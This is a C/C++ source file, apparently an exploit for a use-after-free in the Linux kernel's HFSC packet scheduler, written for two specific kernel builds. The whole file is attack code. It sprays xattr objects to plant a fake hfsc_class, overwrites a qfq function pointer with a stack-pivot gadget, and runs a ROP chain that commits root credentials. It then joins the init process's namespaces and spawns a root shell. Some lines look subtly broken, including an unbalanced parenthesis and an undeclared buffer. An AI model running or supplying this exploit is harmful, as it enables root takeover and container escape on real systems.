#include "pivot/StackPivot.cpp"
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>
#include <errno.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <sys/syscall.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/if_arp.h>

#include <iostream>
#include <cassert>
#include <target/KpwnParser.cpp>
#include <test/kpwn/Kpwn.cpp>
#include <util/incbin.cpp>
#include <util/syscalls.cpp>
#include <util/error.cpp>
#include <util/pwn_utils.cpp>
#include <util/Payload.cpp>
#include <util/HexDump.cpp>
#include <util/ArgumentParser.cpp>
#include <pivot/PivotFinder.cpp>

/* simple_xattr spray */
#define XATTR_SPRAY 32
#define XATTR_HEADER_SIZE 32
#define XATTR_SLAB_LEN 1024
#define XATTR_DATA_LEN (XATTR_SLAB_LEN/2)

/* hfsc_class offsets */
int level_offset;
int cl_parent_offset;
int vt_node_offset;
int cf_node_offset;
int cl_vt_offset;
int cl_cvtmin_offset;

/* Data offsets */
int qfq_change_qdisk_loc;

/* Gadget offsets */
int push_rsi_jmp_qword_PTR_0x70;
int pop_rsp_pop_rbx_ret_thunk;

#define err_exit(s) do { perror(s); exit(EXIT_FAILURE); } while(0)

INCBIN(target_db, "target_db.kpwn");

struct tf_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
#define TC_DATA_LEN 512
    char attrbuf[TC_DATA_LEN];
};

struct if_msg {
    struct nlmsghdr nh;
    struct ifinfomsg ifi;
};

/* Netlink message for setting loopback up. */
struct if_msg if_up_msg = {
    {
        .nlmsg_len = 32,
        .nlmsg_type = RTM_NEWLINK,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
    },
    {
        .ifi_family = AF_UNSPEC,
        .ifi_type = ARPHRD_NETROM,
        .ifi_index = 1,
        .ifi_flags = IFF_UP,
        .ifi_change = 1,
    },

};

int xattr_fd;
Payload payload(512);

void pin_cpu (int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set))
        err_exit("[-] sched_setaffinity");
}

/*
 * Prefetch timing code from Daniel Gruss.
 * https://github.com/IAIK/prefetch
 */

inline __attribute__((always_inline)) size_t rdtsc_begin () {
  size_t a, d;
  asm volatile (
    "mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "xor %%rax, %%rax\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

inline __attribute__((always_inline)) size_t rdtsc_end () {
  size_t a, d;
  asm volatile(
    "xor %%rax, %%rax\n\t"
    "mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

void prefetch (void* p) {
    asm volatile ("prefetchnta (%0)" : : "r" (p));
    asm volatile ("prefetcht2 (%0)" : : "r" (p));
}

size_t onlyreload (void* addr) {
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}

/* Helper functions for creating rtnetlink messages. */

unsigned short add_rtattr (struct rtattr *rta, unsigned short type, unsigned short len, const void *data) {
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    return rta->rta_len;
}

int vuln_class_id = 0x00010001; // 1:1, classid of vulnerable RSC parent.
int def_class_id = 0x00010002; // 1:2, classid where packets are enqueued.
struct tf_msg newqd_msg, newc_msg, delc_msg, new_rsc_msg, new_fsc_msg, new_qfq_qdisc;

void init_tf_msg (struct tf_msg *m) {
    m->nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    m->tm.tcm_family = PF_UNSPEC;
    m->tm.tcm_ifindex = if_nametoindex("lo");
    m->nh.nlmsg_len = NLMSG_LENGTH(sizeof(m->tm));
    m->tm.tcm_parent = TC_H_MAKE(1 << 16, 0);
    m->tm.tcm_info = TC_H_MAKE(1 << 16, 3 << 8); //(prio << 16, protocol << 8)
    m->nh.nlmsg_seq = 1;
}

void init_qdisc_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWQDISC;
    m->tm.tcm_parent = -1;
    m->tm.tcm_handle = 1 << 16;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len));
    short def = 2;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_OPTIONS, 2, &def));
}


void init_rsc_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWTCLASS;
    m->tm.tcm_parent = 1 << 16;
    m->tm.tcm_handle = vuln_class_id;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len));
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);
    int rsc[3] = {1, 1, 1};
    opts->rta_len += RTA_ALIGN(add_rtattr((rtattr *)((char *)opts + opts->rta_len), TCA_HFSC_RSC, sizeof(rsc), rsc));
    m->nh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
}

void init_fsc_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWTCLASS;
    m->tm.tcm_parent = vuln_class_id;
    m->tm.tcm_handle = def_class_id;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len));
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);
    int fsc[3] = {1, 1, 1};
    opts->rta_len += RTA_ALIGN(add_rtattr((rtattr *)((char *)opts + opts->rta_len), TCA_HFSC_FSC, sizeof(fsc), fsc));
    m->nh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
}

void init_del_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    m->nh.nlmsg_type = RTM_DELTCLASS;
    m->tm.tcm_handle = vuln_class_id;
}

void init_qfq_qdisc_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWQDISC;
    m->tm.tcm_parent = 0x00010002;
    m->tm.tcm_handle = 2 << 16;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("qfq") + 1, "qfq"));
    // (TODO) Change rop_buf to Payload
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_OPTIONS, sizeof(rop_buf), rop_buf));
}

void init_nl_msgs (void) {
    init_qdisc_msg(&newqd_msg);
    init_del_class_msg(&delc_msg);
    init_rsc_class_msg(&new_rsc_msg);
    init_fsc_class_msg(&new_fsc_msg);
}

/*
 * Send a Netlink message and check for error
 */
void netlink_write (int sock, struct tf_msg *m) {
    struct {
        struct nlmsghdr nh;
        struct nlmsgerr ne;
    } ack;
    if (write(sock, m, m->nh.nlmsg_len) == -1)
        err_exit("[-] write");
    if (read(sock , &ack, sizeof(ack)) == -1)
        err_exit("[-] read");
    if (ack.ne.error) {
        errno = -ack.ne.error;
        perror("[-] netlink");
    }
}

void netlink_write_noerr (int sock, struct tf_msg *m) {
    if (write(sock, m, m->nh.nlmsg_len) == -1)
        err_exit("[-] write");
}

/*
 * Allocate simple_xattr objects.
 */
int num_xattr = 0;
char xattr_buf[XATTR_DATA_LEN];
void spray_simple_xattrs(int num_spray) {
    char name[32];
    for (int i = 0; i < num_spray; i++, num_xattr++) {
        sprintf(name, "security.%d", num_xattr);
        if (fsetxattr(xattr_fd, name, xattr_buf, XATTR_DATA_LEN, 0) == -1)
            err_exit("[-] fsetxattr");
    }
}

/*
 * Send a message on the loopback device. Used to trigger qdisc enqueue and
 * dequeue functions.
 */
void loopback_send (void) {
    struct sockaddr iaddr = { AF_INET };
    int inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    if (inet_sock_fd == -1)
        err_exit("[-] inet socket");
    if (connect(inet_sock_fd, &iaddr, sizeof(iaddr)) == -1)
        err_exit("[-] connect");
    if (write(inet_sock_fd, "", 1) == -1)
        err_exit("[-] inet write");
    close(inet_sock_fd);
}

int main (int argc, char **argv) {
    long kernel_base;

    KpwnParser kpwn_db(target_db, target_db_size);
    auto target = kpwn_db.AutoDetectTarget();
    printf("[+] Running on target: %s %s\n", target.distro.c_str(), target.release_name.c_str());

    pin_cpu(0);

    /* Get kernel base from command line or prefetch side channel */
    if (argc > 1) {
        kernel_base = strtoul(argv[1], NULL, 16);
        printf("[*] Using provided kernel base: %p\n", kernel_base);
    } else {
        printf("[*] Kernel base is not provided!!!\n");
        exit(EXIT_FAILURE);
    }

    if (target.release_name == "lts-6.1.36") {
        /* hfsc_class offsets */
        level_offset = 100;
        cl_parent_offset = 112;
        vt_node_offset = 192;
        cf_node_offset = 224;
        cl_vt_offset = 280;
        cl_cvtmin_offset = 312;

        /* Data offsets */
        qfq_change_qdisk_loc = 0x0295d438;

        /* Gadget offsets */
        push_rsi_jmp_qword_PTR_0x70 = 0x00df26ac;
        pop_rsp_pop_rbx_ret_thunk = 0x00357c79;
    } else if (target.release_name == "cos-97-16919.353.23") {
        /* hfsc_class offsets */
        level_offset = 92;
        cl_parent_offset = 104;
        vt_node_offset = 184;
        cf_node_offset = 216;
        cl_vt_offset = 272;
        cl_cvtmin_offset = 304;

        /* Data offsets */
        qfq_change_qdisk_loc = 0x025106f8;

        /* Gadget offsets */
        push_rsi_jmp_qword_PTR_0x70 = 0x00ba80ec;
        pop_rsp_pop_rbx_ret_thunk = 0x00791fcf;
    } else {
        printf("[*] Unsupported target selected!\n");
        exit(EXIT_FAILURE);
    }

    check_kaslr_base(kernel_base);

    if (unshare(CLONE_NEWUSER) == -1)
        err_exit("[-] unshare(CLONE_NEWUSER)");
    if (unshare(CLONE_NEWNET) == -1)
        err_exit("[-] unshare(CLONE_NEWNET)");

    /* Open temporary file to use for xattr spray */
    xattr_fd = open("/tmp/", O_TMPFILE | O_RDWR, 0664);
    if (xattr_fd == -1)
        err_exit("[-] open");

    /* Open socket to send netlink commands to */
    int nl_sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (nl_sock_fd == -1)
        err_exit("[-] nl socket");

    /* Set loopback device up */
    if_up_msg.ifi.ifi_index = if_nametoindex("lo");
    netlink_write(nl_sock_fd, (tf_msg *)&if_up_msg);

    init_nl_msgs();

    /* Trigger vuln */
    netlink_write(nl_sock_fd, &newqd_msg);
    netlink_write(nl_sock_fd, &new_rsc_msg);
    netlink_write(nl_sock_fd, &new_fsc_msg);
    loopback_send();
    delc_msg.tm.tcm_handle = def_class_id;
    netlink_write(nl_sock_fd, &delc_msg);

    printf("[+] ROP chain:\n");

    Payload payload(256);
    PivotFinder pivot_finder(target.pivots, Register::RSI, payload);
    payload.Reserve(0, 4);

    RopChain rop(kernel_base);
    target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
    target.AddRopAction(rop, RopActionId::SWITCH_TASK_NAMESPACES, {1});
    target.AddRopAction(rop, RopActionId::TELEFORK, {100000});
    HexDump::Print(rop.GetData());

    auto rop_pivot = pivot_finder.PivotToRop(rop);
    printf("[+] Selected stack pivot: %s\n", rop_pivot.pivot.GetDescription().c_str());
    printf("[+] ROP chain offset: 0x%lx\n", rop_pivot.rop_offset);

    auto rop_data = rop.GetData();
    memcpy(rop_buf + rop_pivot.rop_offset), rop_data.data(), rop_data.size());

    printf("[*] Triggered vulnerability\n");

    /* Place fake hfsc_class in xattr */

    /* hfsc_class.level = 1 (must be non-zero) */
    xattr_buf[level_offset - XATTR_HEADER_SIZE] = 1;
    /* hfsc_class.vt_node = 1 (must be odd) */
    xattr_buf[vt_node_offset - XATTR_HEADER_SIZE] = 1;
    /* hfsc_class.cf_node = 1 (must be odd) */
    xattr_buf[cf_node_offset - XATTR_HEADER_SIZE] = 1;
    /* hfsc_class.parent = &qfq_change_qdisc (write target)*/
    long parent = kernel_base + qfq_change_qdisk_loc - cl_cvtmin_offset;
    memcpy(xattr_buf + cl_parent_offset - XATTR_HEADER_SIZE, &parent, 8);
    /* hfsc_class.cl_vt = jop_gadget (write value) */
    long cl_vt = kernel_base + rop_pivot.pivot.GetGadgetOffset();
    printf("[*] cl_vt: 0x%lx\n", cl_vt);

    memcpy(xattr_buf + cl_vt_offset - XATTR_HEADER_SIZE, &cl_vt, 8);

    printf("[*] Spraying simple_xattrs...\n");
    /* Spray simple_xattrs */
    delc_msg.tm.tcm_handle = vuln_class_id;
    netlink_write(nl_sock_fd, &delc_msg);
    spray_simple_xattrs(XATTR_SPRAY);

    /* Create new default class and trigger enqueue/dequeue to overwrite
     * qfq_change_qdisc with jop gadget */
    new_fsc_msg.tm.tcm_parent = 1 << 16;
    netlink_write(nl_sock_fd, &new_fsc_msg);

    printf("[*] Overwriting function pointer\n");
    loopback_send();

    /* Call overwritten function pointer */
    init_qfq_qdisc_msg(&new_qfq_qdisc);
    netlink_write_noerr(nl_sock_fd, &new_qfq_qdisc);
    printf("[*] Triggering ROP chain\n");
    netlink_write_noerr(nl_sock_fd, &new_qfq_qdisc);

    if (getuid()) {
        printf("[-] Privesc failed\n");
        exit(EXIT_FAILURE);
    }

    printf("[+] Returned from ROP\n");

    int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
    if (mntns_fd == -1)
        perror("[-] open(/proc/1/ns/mnt)");

    int netns_fd = open("/proc/1/ns/net", O_RDONLY);
    if (netns_fd == -1)
        perror("[-] open(/proc/1/ns/net)");

    int pidns_fd = open("/proc/1/ns/pid", O_RDONLY);
    if (pidns_fd == -1)
        perror("[-] open(/proc/1/ns/pid)");

    if (setns(mntns_fd, CLONE_NEWNS) == -1)
        perror("[-] setns mnt");
    if (setns(netns_fd, CLONE_NEWNET) == -1)
        perror("[-] setns net");
    if (setns(pidns_fd, CLONE_NEWPID) == -1)
        perror("[-] setns pid");

    printf("[*] Launching shell\n");
    system("/bin/sh");
}
